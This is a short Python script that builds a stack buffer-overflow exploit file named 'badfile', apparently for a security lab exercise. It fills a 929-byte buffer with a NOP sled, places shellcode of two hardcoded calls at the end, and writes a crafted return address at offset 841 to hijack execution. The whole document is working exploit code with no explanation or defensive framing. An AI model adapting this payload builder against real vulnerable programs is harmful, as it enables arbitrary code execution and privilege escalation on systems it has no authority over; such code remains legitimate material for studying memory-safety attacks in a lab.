#!/usr/bin/python3
shellcode= (
   "\xbb\xa2\x62\x55\x56\xff\xd3\xbb\x08\x90\x55\x56\xff\xd3"
).encode('latin-1')

content = bytearray(0x90 for i in range(929))

start = 929 - len(shellcode)
content[start:start+len(shellcode)] = shellcode

ret = 0xffffcd78 + 0x80
L = 4
offset = 841

content[offset: offset+L] = (ret).to_bytes(L, byteorder='little')

with open("badfile", "wb") as file:
	file.write(content)
